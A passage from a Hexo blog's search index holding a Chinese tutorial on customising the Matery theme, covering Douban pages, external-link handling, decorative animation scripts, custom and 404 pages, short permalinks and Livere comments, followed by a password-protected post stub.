%&gt; &lt;/div&gt; &lt;div <span class="built_in">id</span>=<span class="string">&quot;articleContent&quot;</span> data-aos=<span class="string">&quot;fade-up&quot;</span>&gt; &lt;%- page.content %&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt;</span><br></pre></td></tr></table></figure><p>  注意粘贴的位置和空格要正确，这里的位置随你自己设置，你也可以把简历作为第一个card，然后&#x2F;source&#x2F;about&#x2F;index.md下面写上你的简历了（就像写博客一样）。</p><h4 id="8-豆瓣书单电影页面"><a href="#8-豆瓣书单电影页面" class="headerlink" title="8. 豆瓣书单电影页面"></a><a href="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/#8-%E8%B1%86%E7%93%A3%E4%B9%A6%E5%8D%95%E7%94%B5%E5%BD%B1%E9%A1%B5%E9%9D%A2" title="8. 豆瓣书单电影页面"></a>8. 豆瓣书单电影页面</h4><p>1.首先在博客站点目录执行下面的命令安装豆瓣插件：</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-douban --save</span><br></pre></td></tr></table></figure><p>2.紧接着在博客站点目录的配置文件_config.yml下，添加如下配置：</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">douban: user: 252345665 <span class="comment">#这个需要修改为你个人的id builtin: false #如果想生成豆瓣页面，这个需要设置为true book: title: &#x27;This is my book title&#x27; quote: &#x27;This is my book quote&#x27; movie: title: &#x27;This is my movie title&#x27; quote: &#x27;This is my movie quote&#x27; game: title: &#x27;This is my game title&#x27; quote: &#x27;This is my game quote&#x27; timeout: 10000</span></span><br></pre></td></tr></table></figure><p>**user:**你的豆瓣ID。打开豆瓣，登入账户，然后在右上角点击 ”个人主页“，这时候地址栏的URL大概是这样：<a href="https://www.douban.com/people/xxxxxx/">https://www.douban.com/people/xxxxxx/</a> ，其中的”xxxxxx”就是你的个人ID了。<br><strong>builtin：</strong>是否将生成页面的功能嵌入 hexo s 和 hexo g 中，默认是 false ，另一可选项为 true 。<br><strong>title：</strong> 该页面的标题。<br><strong>quote：</strong> 写在页面开头的一段话,支持html语法。<br><strong>timeout：</strong> 爬取数据的超时时间，默认是 10000ms，如果在使用时发现报了超时的错(ETIMEOUT)可以把这个数据设置的大一点。<br>如果只想显示某一个页面(比如movie)，那就把其他的配置项注释掉即可。</p><p>3.然后再主题配置文件_config.yml中添加关于此页面的菜单：(例如)</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">menu: 媒体: url: / icon: fas fa-list children: - name: 电影 url: /movies icon: fas fa-film - name: 书单 url: /books icon: fas fa-book - name: 游戏 url: /games icon: fas fa-gamepad</span><br></pre></td></tr></table></figure><p>4.适配Matery主题：在 &#x2F;themes&#x2F;hexo-theme-matery&#x2F;layout 文件夹下面创建一个名为 douban.ejs 的文件，并将下面的内容复制进去：</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%- partial(<span class="string">&#x27;_partial/post-cover&#x27;</span>) %&gt; &lt;style&gt; .hexo-douban-picture img &#123; width: 100%; &#125; &lt;/style&gt; &lt;main class=<span class="string">&quot;content&quot;</span>&gt; &lt;div <span class="built_in">id</span>=<span class="string">&quot;contact&quot;</span> class=<span class="string">&quot;container chip-container&quot;</span>&gt; &lt;div class=<span class="string">&quot;card&quot;</span>&gt; &lt;div class=<span class="string">&quot;card-content&quot;</span> style=<span class="string">&quot;padding: 30px&quot;</span>&gt; &lt;h1 style=<span class="string">&quot;margin: 10px 0 10px 0px;&quot;</span>&gt;&lt;%= page.title %&gt;&lt;/h1&gt; &lt;%- page.content %&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=<span class="string">&quot;card&quot;</span>&gt; &lt;div class=<span class="string">&quot;card-content&quot;</span> style=<span class="string">&quot;text-align: center&quot;</span>&gt; &lt;h3 style=<span class="string">&quot;margin: 5px 0 5px 5px;&quot;</span>&gt;如果你有好的内容推荐，欢迎在下面留言！&lt;/h3&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=<span class="string">&quot;card&quot;</span>&gt; &lt;% <span class="keyword">if</span> (theme.gitalk &amp;&amp; theme.gitalk.enable) &#123; %&gt; &lt;%- partial(<span class="string">&#x27;_partial/gitalk&#x27;</span>) %&gt; &lt;% &#125; %&gt; &lt;% <span class="keyword">if</span> (theme.gitment.enable) &#123; %&gt; &lt;%- partial(<span class="string">&#x27;_partial/gitment&#x27;</span>) %&gt; &lt;% &#125; %&gt; &lt;% <span class="keyword">if</span> (theme.disqus.enable) &#123; %&gt; &lt;%- partial(<span class="string">&#x27;_partial/disqus&#x27;</span>) %&gt; &lt;% &#125; %&gt; &lt;% <span class="keyword">if</span> (theme.livere &amp;&amp; theme.livere.enable) &#123; %&gt; &lt;%- partial(<span class="string">&#x27;_partial/livere&#x27;</span>) %&gt; &lt;% &#125; %&gt; &lt;% <span class="keyword">if</span> (theme.valine &amp;&amp; theme.valine.enable) &#123; %&gt; &lt;%- partial(<span class="string">&#x27;_partial/valine&#x27;</span>) %&gt; &lt;% &#125; %&gt; &lt;/div&gt; &lt;/div&gt; &lt;/main&gt;</span><br></pre></td></tr></table></figure><p>5.然后在博客站点目录下的node_modules文件夹下找到hexo-douban&#x2F;lib，文件夹下有三个js文件，分别为：books-generator.js 、games-generator.js 、movies-generator.js，用文本编辑器打开这三个文件，并将其文件内容末尾的代码修改为一下内容：</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/* 原文件内容为 layout: [`page`, `post`] ，将其修改为下面的内容*/ layout: [`page`, `douban`]</span><br></pre></td></tr></table></figure><p>6.最后就是使用并生成相应的页面，执行命令如下:</p><p>  <strong>需要注意的是</strong>，通常大家都喜欢用 hexo d 来作为 hexo deploy 命令的简化，但是当安装了 hexo douban 之后，就不能用 hexo d 了，因为 hexo douban 跟 hexo deploy 的前缀都是 hexo d ，你以后执行的 hexo d 将不再是 Hexo 页面的生成，而是豆瓣页面的生成。</p><p>  以下是可选的命令参数：</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-h, --<span class="built_in">help</span> <span class="comment"># 帮助页面 -b, --books # 只生成书单页面 -g, --games # 只生成游戏页面 -m, --movies # 只生成电影页面</span></span><br></pre></td></tr></table></figure><p>  <strong>当站点配置文件的builtin的值为true时，生成页面的功能会嵌入到hexo g和hexo s中，在进行部署生成操作，会自动生成相应的页面。</strong></p><h4 id="9-外链跳转插件"><a href="#9-外链跳转插件" class="headerlink" title="9. 外链跳转插件"></a><a href="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/#9-%E5%A4%96%E9%93%BE%E8%B7%B3%E8%BD%AC%E6%8F%92%E4%BB%B6" title="9. 外链跳转插件"></a>9. 外链跳转插件</h4><p>  hexo-external-link是一个跳转外链相关插件。自动为所有html文件中外链的a标签生成对应的属性。 比如 设置target&#x3D;’_blank’, rel&#x3D;’external nofollow noopener noreferrer’ 告诉搜索引擎这是外部链接,不要将该链接计入权重。 同时自动生成外链跳转页面,默认在根目录下 go.html;</p><p>  使用 npm 或者 yarn 安装</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## npm 安装 npm install hexo-external-link --save ## yarn 安装 yarn add hexo-external-link</span></span><br></pre></td></tr></table></figure><p>  之后再hexo博客站点根目录下添加如下配置：</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo_external_link: <span class="built_in">enable</span>: <span class="literal">true</span> enable_base64_encode: <span class="literal">true</span> url_param_name: <span class="string">&#x27;u&#x27;</span> html_file_name: <span class="string">&#x27;go.html&#x27;</span> target_blank: <span class="literal">true</span> link_rel: <span class="string">&#x27;external nofollow noopener noreferrer&#x27;</span> domain: <span class="string">&#x27;your_domain&#x27;</span> <span class="comment"># 如果开启了防盗链 safety_chain: true</span></span><br></pre></td></tr></table></figure><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">enable</span> - 是否开启hexo_external_link插件 - 默认 <span class="literal">false</span> enable_base64_encode - 是否对跳转url使用<span class="built_in">base64</span>编码 - 默认 fasle url_param_name - url参数名,在跳转到外链传递给html_file_name的参数名 - 默认 ‘u’ html_file_name - 跳转到外链的页面文件路径 - 默认 ‘go.html’ target_blank - 是否为外链的a标签添加target=<span class="string">&#x27;_blank&#x27;</span> - 默认 <span class="literal">true</span> link_rel - 设置外链的a标签的rel属性 - 默认 ‘external nofollow noopener noreferrer’ domain - 如果开启了防盗链,除了 localhost 和 domain 之外调用会跳到主页,同时也是判断链接是否为外链的依据 - 默认 window.location.host safety_chain - go.html 为了防止外链盗用 对域名进行的判断 - 默认 <span class="literal">false</span></span><br></pre></td></tr></table></figure><h4 id="10-添加动态科技线条背景"><a href="#10-添加动态科技线条背景" class="headerlink" title="10. 添加动态科技线条背景"></a><a href="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/#10-%E6%B7%BB%E5%8A%A0%E5%8A%A8%E6%80%81%E7%A7%91%E6%8A%80%E7%BA%BF%E6%9D%A1%E8%83%8C%E6%99%AF" title="10. 添加动态科技线条背景"></a>10. 添加动态科技线条背景</h4><p>  在themes&#x2F;matery&#x2F;layout&#x2F;layout.ejs文件中添加如下代码：</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--动态线条背景--&gt; &lt;script <span class="built_in">type</span>=<span class="string">&quot;text/javascript&quot;</span> color=<span class="string">&quot;122 103 238&quot;</span> opacity=<span class="string">&#x27;0.7&#x27;</span> zIndex=<span class="string">&quot;-2&quot;</span> count=<span class="string">&quot;200&quot;</span> src=<span class="string">&quot;//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js&quot;</span>&gt; &lt;/script&gt;</span><br></pre></td></tr></table></figure><p>  其中：</p><p>  <strong>color：</strong>表示线条颜色，三个数字分别为(R,G,B)，默认：（0,0,0）<br>  <strong>opacity：</strong>表示线条透明度（0~1），默认：0.5<br>  <strong>count：</strong>表示线条的总数量，默认：150<br>  <strong>zIndex：</strong>表示背景的z-index属性，css属性用于控制所在层的位置，默认：-1</p><h4 id="11-添加鼠标点击烟花爆炸效果"><a href="#11-添加鼠标点击烟花爆炸效果" class="headerlink" title="11. 添加鼠标点击烟花爆炸效果"></a><a href="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/#11-%E6%B7%BB%E5%8A%A0%E9%BC%A0%E6%A0%87%E7%82%B9%E5%87%BB%E7%83%9F%E8%8A%B1%E7%88%86%E7%82%B8%E6%95%88%E6%9E%9C" title="11. 添加鼠标点击烟花爆炸效果"></a>11. 添加鼠标点击烟花爆炸效果</h4><p>  首先在themes&#x2F;matery&#x2F;source&#x2F;js目录下新建fireworks.js文件，打开这个网址<a href="https://cdn.jsdelivr.net/gh/Yafine/cdn@2.5/source/js/fireworks.js">连接</a>，将内容复制粘贴到fireworks.js即可。</p><p>  然后再themes&#x2F;matery&#x2F;layout&#x2F;layout.ejs文件内添加下面的内容：</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;canvas class=<span class="string">&quot;fireworks&quot;</span> style=<span class="string">&quot;position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;&quot;</span> &gt;&lt;/canvas&gt; &lt;script <span class="built_in">type</span>=<span class="string">&quot;text/javascript&quot;</span> src=<span class="string">&quot;//cdn.bootcss.com/animejs/2.2.0/anime.min.js&quot;</span>&gt;&lt;/script&gt; &lt;script <span class="built_in">type</span>=<span class="string">&quot;text/javascript&quot;</span> src=<span class="string">&quot;/js/fireworks.js&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>  然后hexo clean &amp;&amp; hexo g &amp;&amp; hexo s即可，就可以看到效果了。</p><h4 id="12-添加樱花飘落效果"><a href="#12-添加樱花飘落效果" class="headerlink" title="12. 添加樱花飘落效果"></a><a href="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/#12-%E6%B7%BB%E5%8A%A0%E6%A8%B1%E8%8A%B1%E9%A3%98%E8%90%BD%E6%95%88%E6%9E%9C" title="12. 添加樱花飘落效果"></a>12. 添加樱花飘落效果</h4><p>  先看效果：我用的就是樱花</p><p>  在themes&#x2F;matery&#x2F;source&#x2F;js目录下新建sakura.js文件，打开这个网址<a href="https://cdn.jsdelivr.net/gh/Yafine/cdn@2.5/source/js/sakura.js">连接</a>，将内容复制粘贴到sakura.js即可。</p><p>  然后再themes&#x2F;matery&#x2F;layout&#x2F;layout.ejs文件内添加下面的内容：</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script <span class="built_in">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt; //只在桌面版网页启用特效 var windowWidth = $(window).width(); <span class="keyword">if</span> (windowWidth &gt; 768) &#123; document.write(<span class="string">&#x27;&lt;script type=&quot;text/javascript&quot; src=&quot;/js/sakura.js&quot;&gt;&lt;\/script&gt;&#x27;</span>); &#125; &lt;/script&gt;</span><br></pre></td></tr></table></figure><h4 id="13-添加鼠标彩虹星星掉落跟随效果"><a href="#13-添加鼠标彩虹星星掉落跟随效果" class="headerlink" title="13. 添加鼠标彩虹星星掉落跟随效果"></a><a href="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/#13-%E6%B7%BB%E5%8A%A0%E9%BC%A0%E6%A0%87%E5%BD%A9%E8%99%B9%E6%98%9F%E6%98%9F%E6%8E%89%E8%90%BD%E8%B7%9F%E9%9A%8F%E6%95%88%E6%9E%9C" title="13. 添加鼠标彩虹星星掉落跟随效果"></a>13. 添加鼠标彩虹星星掉落跟随效果</h4><p>  在themes&#x2F;matery&#x2F;source&#x2F;js目录下新建cursor.js文件，打开这个<a href="https://cdn.jsdelivr.net/gh/Yafine/cdn@2.5/source/js/cursor.js">网址</a>，将内容复制粘贴到cursor.js即可。</p><p>  然后再themes&#x2F;matery&#x2F;layout&#x2F;layout.ejs文件内添加下面的内容：</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;/js/cursor.js&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><h4 id="14-添加雪花飘落效果"><a href="#14-添加雪花飘落效果" class="headerlink" title="14. 添加雪花飘落效果"></a><a href="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/#14-%E6%B7%BB%E5%8A%A0%E9%9B%AA%E8%8A%B1%E9%A3%98%E8%90%BD%E6%95%88%E6%9E%9C" title="14. 添加雪花飘落效果"></a>14. 添加雪花飘落效果</h4><p>  跟樱花类似<br>  在themes&#x2F;matery&#x2F;source&#x2F;js目录下新建snow.js文件，打开这个<a href="https://cdn.jsdelivr.net/gh/Yafine/cdn@2.5/source/js/snow1.js">网址</a>，将内容复制粘贴到cursor.js即可。</p><p>  然后再themes&#x2F;matery&#x2F;layout&#x2F;layout.ejs文件内添加下面的内容：</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;/js/snow.js&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><h4 id="15-添加自定义页面"><a href="#15-添加自定义页面" class="headerlink" title="15. 添加自定义页面"></a><a href="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/#15-%E6%B7%BB%E5%8A%A0%E8%87%AA%E5%AE%9A%E4%B9%89%E9%A1%B5%E9%9D%A2" title="15. 添加自定义页面"></a>15. 添加自定义页面</h4><p>  首先看一下效果  </p><p><img src= "" data-lazy-src="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/54.jpg" alt="54"></p><p><strong>54</strong></p><p>  首先在站点目录下的source文件夹下新建aboutme文件，文件名可自定义，然后编写一个index.html放入aboutme文件夹下，然后在主题配置文件下的导航配置信息添加下面的配置：</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">About: url: / icon: fas fa-address-card children: - name: 关于我 url: /about icon: fas fa-user-circle - name: Another <span class="comment">#这是新添加的，在原有配置基础上添加 url: /aboutme icon: fa fa-user-secret</span></span><br></pre></td></tr></table></figure><p>  然后在站点配置文件下，找到skip_render，在后面添加属性，如下：</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">skip_render: aboutme/** <span class="comment"># 其意思为在对文件进行渲染时跳过aboutme文件下的所有文件</span></span><br></pre></td></tr></table></figure><p>  知道方法后，你可以添加你自己想要添加的页面，让你的博客内容更加充实。</p><h4 id="16-添加404页面"><a href="#16-添加404页面" class="headerlink" title="16. 添加404页面"></a><a href="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/#16-%E6%B7%BB%E5%8A%A0404%E9%A1%B5%E9%9D%A2" title="16. 添加404页面"></a>16. 添加404页面</h4><p>  我的404页面是这样的：  </p><p><img src= "" data-lazy-src="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/55.jpg" alt="55"></p><p><strong>55</strong></p><p>  开始说一下配置步骤，首先再站点根目录下的source文件夹下新建404.md文件，里面内容如下：</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--- title: 404 <span class="built_in">date</span>: 2022-5-2 16:41:10 <span class="built_in">type</span>: <span class="string">&quot;404&quot;</span> layout: <span class="string">&quot;404&quot;</span> description: <span class="string">&quot;Oops～，我崩溃了！找不到你想要的页面了&quot;</span> ---</span><br></pre></td></tr></table></figure><p>  紧接着再新建主题文件夹的layout目录下新建404.ejs文件，添加内容如下：</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;style <span class="built_in">type</span>=<span class="string">&quot;text/css&quot;</span>&gt; /* don<span class="string">&#x27;t remove. */ .about-cover &#123; height: 90.2vh; &#125; &lt;/style&gt; &lt;div class=&quot;bg-cover pd-header about-cover&quot;&gt; &lt;div class=&quot;container&quot;&gt; &lt;div class=&quot;row&quot;&gt; &lt;div class=&quot;col s10 offset-s1 m8 offset-m2 l8 offset-l2&quot;&gt; &lt;div class=&quot;brand&quot;&gt; &lt;div class=&quot;title center-align&quot;&gt; 404 &lt;/div&gt; &lt;div class=&quot;description center-align&quot;&gt; &lt;%= page.description %&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;script&gt; // 每天切换 banner 图. Switch banner image every day. $(&#x27;</span>.bg-cover<span class="string">&#x27;).css(&#x27;</span>background-image<span class="string">&#x27;, &#x27;</span>url(https://cdn.jsdelivr.net/gh/Yafine/cdn@2.6/source/medias/banner/<span class="string">&#x27; + new Date().getDay() + &#x27;</span>.jpg)<span class="string">&#x27;); &lt;/script&gt;</span></span><br></pre></td></tr></table></figure><p>  然后部署，再看看效果即可。</p><h4 id="17-文章生成永久链接"><a href="#17-文章生成永久链接" class="headerlink" title="17. 文章生成永久链接"></a><a href="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/#17-%E6%96%87%E7%AB%A0%E7%94%9F%E6%88%90%E6%B0%B8%E4%B9%85%E9%93%BE%E6%8E%A5" title="17. 文章生成永久链接"></a>17. 文章生成永久链接</h4><p>  主题默认的文章链接配置是</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">premalink: :year/:month/:day/:title</span><br></pre></td></tr></table></figure><p>  这种生成的链接地址很长，文章版权的链接地址会出现一大串字符编码，一点也不好看。因此需要修改文章生成链接的格式。</p><p>  首先再根目录下执行下面的命令：</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-abbrlink --save</span><br></pre></td></tr></table></figure><p>  然后再站点配置文件下添加如下配置：</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">abbrlink: alg: crc16 <span class="comment">#算法： crc16(default) and crc32 rep: hex #进制： dec(default) and hex: dec #输出进制：十进制和十六进制，默认为10进制。丨dec为十进制，hex为十六进制</span></span><br></pre></td></tr></table></figure><p>  再将站点配置文件的permalink的值修改为：</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">permalink: posts/:abbrlink.html <span class="comment"># 此处可以自己设置，也可以直接使用 :/abbrlink</span></span><br></pre></td></tr></table></figure><p>  生成文章的链接格式就会是如下样例（官方样例）:</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crc16 &amp; hex https://post.zz173.com/posts/66c8.html crc16 &amp; dec https://post.zz173.com/posts/65535.html crc32 &amp; hex https://post.zz173.com/posts/8ddf18fb.html crc32 &amp; dec https://post.zz173.com/posts/1690090958.html</span><br></pre></td></tr></table></figure><p>  生成完后，原md文件的Front-matter 内会增加abbrlink 字段，值为生成的ID 。这个字段确保了在我们修改了Front-matter 内的博客标题title或创建日期date字段之后而不会改变链接地址。</p><h3 id="七、添加评论系统"><a href="#七、添加评论系统" class="headerlink" title="七、添加评论系统"></a><a href="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/#%E4%B8%83%E3%80%81%E6%B7%BB%E5%8A%A0%E8%AF%84%E8%AE%BA%E7%B3%BB%E7%BB%9F" title="七、添加评论系统"></a>七、添加评论系统</h3><p>  我只说我用的评论系统的配置方法，其他的就不说了。</p><h4 id="添加来必力评论系统"><a href="#添加来必力评论系统" class="headerlink" title="添加来必力评论系统"></a><a href="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/#%E6%B7%BB%E5%8A%A0%E6%9D%A5%E5%BF%85%E5%8A%9B%E8%AF%84%E8%AE%BA%E7%B3%BB%E7%BB%9F" title="添加来必力评论系统"></a>添加来必力评论系统</h4><p>  首先去来<a href="https://livere.com/">必力官网</a>，点击导航栏上的安装，会出现如下图的页面：  </p><p><img src= "" data-lazy-src="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/56.jpg" alt="56"></p><p><strong>56</strong></p><p>  City 版：是一款适合所有人使用的免费版本；<br>Premium 版：是一款能够帮助企业实现自动化管理的多功能收费版本。</p><p>  注册完之后，会提示你填写网站的相关信息，如网站链接，网站名称等等，填写完毕之后，会给你一段代码，如下图所示：  </p><p><img src= "" data-lazy-src="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/57.jpg" alt="57"></p><p><strong>57</strong></p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Livere comment configuration, the default is not activated # Livere 来必力评论模块的配置，默认为不激活 livere: enable: true # true即为开启评论系统 uid: #这里填写你的uid</span></span><br></pre></td></tr></table></figure><p>  然后在执行相关的部署命令，然后查看效果即可。  </p><p><img src= "" data-lazy-src="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/58.jpg" alt="58"></p><p><strong>58</strong></p><h3 id="八、成功了"><a href="#八、成功了" class="headerlink" title="八、成功了"></a><a href="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/#%E5%85%AB%E3%80%81%E6%88%90%E5%8A%9F%E4%BA%86" title="八、成功了"></a>八、成功了</h3><p>  我相信经过大家的不懈努力，大家的博客应该搭建的很好了，虽然用了很多时间，但搭建完成后的成就感是真的巴适。<br>  正如我现在写完了这篇博文，断断续续花了我十多天，一点点敲打出来是真的很辛苦，但完成了的感觉像是在起飞，哈哈。<br>  如果这篇教程对你有些许的帮助，也就是我编写的收获，日后我会不定时进行一些更新，需要友链的请留言。</p><p>  最后，写一个教程真的很不容易，希望各位大佬大家能多多支持，不管是送我<strong>喝瓶水</strong>，还是请我<strong>吃颗糖</strong>，都将是我继续做下去的动力。</p><h4 id="-1"><a href="#-1" class="headerlink" title=""></a><a href="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/#%E7%82%B9%E5%87%BB%E6%9C%80%E5%90%8E%E7%9A%84%E2%80%9C%E8%B5%8F%E2%80%9D%E5%AD%97%EF%BC%8C%E8%B0%A2%E8%B0%A2" title="点击最后的“赏”字，谢谢"></a></h4><p><strong>点击最后的“赏”字，谢谢</strong></p><p><img src= "" data-lazy-src="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/59.jpg" alt="谢谢老板"></p><p><strong>谢谢老板</strong></p>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> 博客 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo教程</title>
      <link href="/posts/f0a4488f.html"/>
      <url>/posts/f0a4488f.html</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看加密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="619bbb9f2c41284f42de0a8d9b161318f7f5b8fd5ca7e94a3e05237bed6cab89"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-xray">      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">您好, 这里需要密码.</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> 加密 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
